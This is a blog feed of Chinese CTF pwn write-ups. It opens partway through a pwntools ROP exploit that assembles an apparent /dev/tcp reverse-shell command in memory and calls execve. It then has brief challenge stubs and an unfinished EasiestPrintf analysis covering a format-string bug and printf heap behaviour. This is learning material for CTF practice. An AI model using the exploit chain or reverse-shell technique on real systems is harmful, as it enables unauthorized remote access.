pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08070f9c</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ed086</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 14</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080bf3b6</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop eax ; ret</span>
pay <span class="token operator">+=</span> <span class="token string">'/127'</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08099e16</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; pop ebx; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0xdeedbeef</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># padding</span>

pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08070f9c</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ed08a</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 14</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080bf3b6</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop eax ; ret</span>
pay <span class="token operator">+=</span> <span class="token string">'.0.0'</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08099e16</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; pop ebx; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0xdeedbeef</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># padding</span>

pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08070f9c</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ed08e</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 14</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080bf3b6</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop eax ; ret</span>
pay <span class="token operator">+=</span> <span class="token string">'.1/7'</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08099e16</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; pop ebx; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0xdeedbeef</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># padding</span>

pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08070f9c</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ed092</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 14</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080bf3b6</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop eax ; ret</span>
pay <span class="token operator">+=</span> <span class="token string">'777 '</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08099e16</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; pop ebx; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0xdeedbeef</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># padding</span>

pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08070f9c</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ed096</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 14</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080bf3b6</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop eax ; ret</span>
pay <span class="token operator">+=</span> <span class="token string">'0>&amp;1'</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08099e16</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; pop ebx; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0xdeedbeef</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># padding</span>

pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08070f9c</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ed09a</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 14</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08048bdf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># xor eax, eax ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08099e16</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0xdeedbeef</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#-----------------------------------------------</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08070f9c</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ed104</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 14</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080bf3b6</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop eax ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ed060</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># </span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08099e16</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; pop ebx; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0xdeedbeef</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># padding</span>

pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08070f9c</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ed108</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 14</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080bf3b6</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop eax ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ed069</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># </span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08099e16</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; pop ebx; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0xdeedbeef</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># padding</span>

pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08070f9c</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ed10c</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 14</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080bf3b6</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop eax ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ed06e</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># </span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08099e16</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; pop ebx; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0xdeedbeef</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># padding</span>
<span class="token comment" spellcheck="true">#-----------------------------------------------</span>


pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080481c5</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop ebx ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ed060</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data</span>

pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08083ca3</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop ecx ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ed104</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data</span>

pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08070f9c</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ed09a</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data</span>

pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08048bdf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># xor eax, eax ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807dfaf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807dfaf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807dfaf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807dfaf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807dfaf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807dfaf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807dfaf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807dfaf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807dfaf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807dfaf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807dfaf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807181f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># int 0x80</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"cccc:"</span> <span class="token operator">+</span> <span class="token string">"b"</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">+</span> <span class="token string">'d'</span> <span class="token operator">*</span> <span class="token number">44</span> <span class="token operator">+</span> pay<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>关于data的注释可能有问题懒得改了…累死了==</p>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
            <category> 学习 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[NJCTF2017 | pwn]]></title>
      <url>/2018/07/07/NJCTF2017-pwn/</url>
      <content type="html"></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[HITCON training]]></title>
      <url>/2018/07/06/HITCON-training/</url>
      <content type="html"><![CDATA[<p>之前复现过zoo, 这里想把其他的也复现一下, 一项一项来吧, 加油, Aryb1n</p>
<p>复现完这几道… 我想每天做一套CF…</p>
<p>我想捡起来, 但又胆怯</p>
<p>自己骗自己大学已经没有遗憾了</p>
<p>其实什么都没做好, 保研, 比赛…都很伤…</p>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[0ctf2015 | Flagen]]></title>
      <url>/2018/07/06/0ctf2015-Flagen/</url>
      <content type="html"><![CDATA[<p>覆盖<code>__stack_chk_fail@got</code>…真是学到了</p>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[0ctf2015 | Freenote]]></title>
      <url>/2018/07/06/0ctf2015-Freenote/</url>
      <content type="html"><![CDATA[<p>经典的double free题目, 伪造堆块</p>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[0ctf2017 | EasiestPrintf]]></title>
      <url>/2018/07/06/0ctf2017-EasiestPrintf/</url>
      <content type="html"><![CDATA[<p>这题看起来不很复杂…</p>
<p>有个函数没见过,alloca</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl __noreturn <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// esp@3</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+3h] [bp-15h]@1</span>
  <span class="token keyword">int</span> fd<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+4h] [bp-14h]@1</span>
  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+8h] [bp-10h]@3</span>
  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+Ch] [bp-Ch]@1</span>

  v7 <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">MK_FP</span><span class="token punctuation">(</span>__GS__<span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">alarm</span><span class="token punctuation">(</span><span class="token number">0x3Cu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">3u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/urandom"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">1u</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v6 <span class="token operator">=</span> buf<span class="token punctuation">;</span>
<span class="token operator">=</span><span class="token operator">></span>  v3 <span class="token operator">=</span> <span class="token function">alloca</span><span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>buf <span class="token operator">+</span> <span class="token number">30</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">0x10u</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">=</span><span class="token operator">></span>  <span class="token function">do_read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">=</span><span class="token operator">></span>  <span class="token function">leave</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>据说这里的<code>alloca</code>能够手动随机化栈地址…没太懂…而且这…分配的v3好像没用上啊…</p>
<p>在之后的<code>do_read</code>里, 可以泄露一次地址的内容</p>
<p><code>leave</code>里有一个格式化字符串的洞, 之后就直接exit了</p>
<p>而且这题除了PIE, 其他的保护都开了, 所以不能改got表…</p>
<p>按照之前学过的套路…那应该是改malloc_hook之类的东西…leak出来libc_base, 算出来malloc_hook的位置, 然后写one_gadget…可…该去写啥东西呢</p>
<p>不过, 只能leak一次, 根据一个地址, 然后在libcdatabase里找吗…</p>
<p>这题没有看到malloc或者free…改了malloc_hook or free_hook好像也没用…我们的printf或者exit会用这个吗…</p>
<p>woc, 好像…有可能, 诶?<br>但我们开始把<code>stdin</code>, <code>stdout</code>, <code>stderr</code>的缓冲区都设置为空了….printf还会和堆地址有关系吗</p>
<p>查了查…好像是说在输出宽度比<code>0x1000 - 0x20</code>大的时候…在调用printf的时候会会调用malloc, 在printf结束之前会调用free来释放, 就是会在printf调用结束之后发现一个堆(因为已经free掉了…所以只能看到一个topchunk了)</p>
<p>做了一下实验…还真的是…下面的例子确实会使用堆…</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%65505c"</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 这里如果是65504就不会产生堆..</span>
    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>所以, 这样就OK了</p>
<p>雾…这里注意一下, 如果不关掉<code>stdout</code>的缓冲区的话…那么只要调用printf, 就会留下一个堆上的缓冲区, 而且printf调用后, 不会立即被释放…之后还能用的, 如下图所示</p>
<pre class="line-numbers language-python"><code class="language-python">db<span class="token operator">-</span>peda$ heap all
Top Chunk<span class="token punctuation">:</span>  <span class="token number">0x804b408</span>
Last Remainder<span class="token punctuation">:</span>  <span class="token number">0x0</span>
<span class="token number">0x804b000</span> SIZE<span class="token operator">=</span><span class="token number">0x408</span> DATA<span class="token punctuation">[</span><span class="token number">0x804b008</span><span class="token punctuation">]</span> <span class="token operator">|</span>ssss<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">|</span> INUSED PREV_INUSE
<span class="token number">0x804b408</span> SIZE<span class="token operator">=</span><span class="token number">0x20bf8</span> TOP_CHUNK
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个和上面说的, 即使取消stdout缓冲区, 在输出一定宽度内容的时候printf也会申请堆块是不一样的</p>
<p>之后找了一下wp…因为最开始选做这题是因为记得某次有人说这题可以通过改虚表来实现控制流劫持…这里学习一下</p>
<p>要跟着看一下printf源码, 打开gdb先打一下这个…之前好像记得哪里看到说这个不支持递归操作…所以指定到printf.c在的目录</p>
<pre class="line-numbers language-bash"><code class="language-bash">gdb-peda$ directory /home/haibin/glibc/glibc-2.23/stdio-common/
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>emmmmm, 可以看到printf实际上是调用了<code>vprintf</code>, 而且第一个参数是<code>stdout</code></p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token number">26</span>    <span class="token keyword">int</span>
